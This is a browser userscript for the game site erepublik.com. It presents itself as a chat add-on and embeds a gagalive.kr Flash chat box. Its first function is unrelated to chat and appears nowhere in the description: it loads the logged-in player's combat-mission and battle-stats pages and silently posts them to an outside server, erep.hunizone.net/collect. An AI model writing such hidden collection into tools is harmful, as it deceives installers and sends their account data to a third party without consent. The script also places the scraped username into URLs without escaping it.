// ==UserScript==
// @name       eSK chat
// @version    0.14
// @description  chat for esk
// @include      http://www.erepublik.com/*
// @exclude      http://www.erepublik.com/en/main/cometcha*
// @require https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @downloadURL	 http://userscripts.org/scripts/source/182832.user.js 
// @updateURL	 http://userscripts.org/scripts/source/182832.meta.js
// @copyright  2012+, You
// ==/UserScript==
String.prototype.trim = function() {
    return this.replace(/(^\s*)|(\s*$)/gi, "");
}

function xchng() {
    $ = jQuery.noConflict();

    var collectHost = 'http://erep.hunizone.net/collect';

    // report current available combat orders to central server
    $.get('/' + erepublik.settings.culture + '/military/campaigns', function(data) {
        var campaigns = {};
        var i = 0;
        $(data).find('.icons_battles.combat_missions').each(function(index, el) {
            var id = parseInt($(el).parent().attr('id').replace('battle-', ''), 10);
            campaigns[id] = [];
            i++;
        });

        var payload = [];
        var j = 0;
        for (var id in campaigns) {
            $.get('/' + erepublik.settings.culture + '/military/battle-stats/' + id + '/1', function(data) {
                j++;
                payload.push(data);

                if (j == i) {
                    $.post(collectHost + '/battlestats.php', {
                        payload: payload
                    });
                }
            });
        }
    });
};

var script = document.createElement('script');
script.textContent = '(' + xchng.toString() + ')();';
document.body.appendChild(script);

/* */
if(window.location.href.indexOf('erepublik.com/chat')>-1) {
    $('body').empty();
	$.ajax({
        url: "http://www.erepublik.com/"
    }).done(function( data ) {
		if ( console && console.log ) {
            //console.log( "data:", $(data).find('a.user_name').text().trim());
        }
        $('body').html('<embed height="'+$(document).height()+'" width="100%" src="http://www.gagalive.kr/livechat1.swf?chatroom=~~~new_erepublik&position=1&user='+$(data).find('a.user_name').text().trim()+'&fontlarge=true"></embed></div>');
    });
    localStorage.setItem('eskchat.fullsize', 'true');
    $(window).bind('beforeunload', function(){
        localStorage.setItem('eskchat.fullsize', 'false');
	});
} else {
    if(localStorage.getItem('eskchat.fullsize') != 'true') {
        $('body').append('<script>'
                       + 'function switchGagalive() {'
                       + '    if(localStorage.getItem("eskchat.enable") == "false") {'
                       + '        localStorage.setItem("eskchat.enable", "true");'
                       + '        $j("#gagaliveStatus").text("On");'
                       + '        $j("#gagalivemb").show();'
                       + '        $j("#gagalive").animate({height: "515"});'
                       + '    } else {'
                       + '        localStorage.setItem("eskchat.enable", "false");'
                       + '        $j("#gagaliveStatus").text("Off");'
                       + '        $j("#gagalive").animate({height: "15"});'
                       + '        $j("#gagalivemb").hide();'
                       + '    }'
                       + '}</script>'
                       + '<div id="gagalive" style="overflow:hidden; z-index:2000; border: 1; height:'+(localStorage.getItem("eskchat.enable") == "false"?'15':'515')+'px; width:200px; position: absolute; top: 20px; right: 0px; display:block;text-align:right;background:#FFF;">'
                       + '<a href="#" onClick="javascript:switchGagalive();" id="gagaliveStatus">'+(localStorage.getItem("eskchat.enable") == "false"?'Off':'On')+'</a>&nbsp; &nbsp; '
                       + '<a href="#" onClick="javascript:$j(\'#gagalive\').animate({width: \'200\'})">﹤</a>&nbsp; &nbsp; '
                       + '<a href="#" onClick="javascript:$j(\'#gagalive\').animate({width: \'100\'})">﹥</a>&nbsp; &nbsp; '
                       + '<a href="/chat" target="_blank">﹓</a>&nbsp; &nbsp; <br/>'
                       + '<embed id="gagalivemb" height="500" width="200" src="http://www.gagalive.kr/livechat1.swf?chatroom=~~~new_erepublik&position=2&user=' + $('a.user_name').text() +'&fontlarge=true"></embed></div>');

        shortcut.remove('shift+a');
        shortcut.remove('shift+c');
        shortcut.remove('shift+k');
        shortcut.remove('shift+l');
        shortcut.remove('shift+m');
        shortcut.remove('shift+n');
        shortcut.remove('shift+s');
        shortcut.remove('shift+t');
        shortcut.remove('shift+w');
    } else {
        localStorage.setItem("eskchat.enable", "false");
        $('body').append('<script>'
                       + 'function switchGagalive() {'
                       + '    if(localStorage.getItem("eskchat.enable") == "false") {'
                       + '        localStorage.setItem("eskchat.enable", "true");'
                       + '        $j("#gagaliveStatus").text("On");'
                       + '        $j("#gagalivemb").show();'
                       + '        $j("#gagalive").animate({height: "515"});'
                       + '    } else {'
                       + '        localStorage.setItem("eskchat.enable", "false");'
                       + '        $j("#gagaliveStatus").text("Off");'
                       + '        $j("#gagalive").animate({height: "15"});'
                       + '        $j("#gagalivemb").hide();'
                       + '    }'
                       + '}</script>'
                       + '<div id="gagalive" style="overflow:hidden; z-index:2000; border: 1; height:'+(localStorage.getItem("eskchat.enable") == "false"?'15':'515')+'px; width:200px; position: absolute; top: 20px; right: 0px; display:block;text-align:right;background:#FFF;">'
                       + '<a href="#" onClick="javascript:switchGagalive();" id="gagaliveStatus">'+(localStorage.getItem("eskchat.enable") == "false"?'Off':'On')+'</a>&nbsp; &nbsp; '
                       + '<a href="#" onClick="javascript:$j(\'#gagalive\').animate({width: \'200\'})">﹤</a>&nbsp; &nbsp; '
                       + '<a href="#" onClick="javascript:$j(\'#gagalive\').animate({width: \'100\'})">﹥</a>&nbsp; &nbsp; '
                       + '<a href="/chat" target="_blank">﹓</a>&nbsp; &nbsp; <br/>'
                       + '<embed id="gagalivemb" height="500" width="200" src="http://www.gagalive.kr/livechat1.swf?chatroom=~~~new_erepublik&position=2&user=' + $('a.user_name').text() +'&fontlarge=true" style="display: none;"></embed></div>');
    }
}
/* */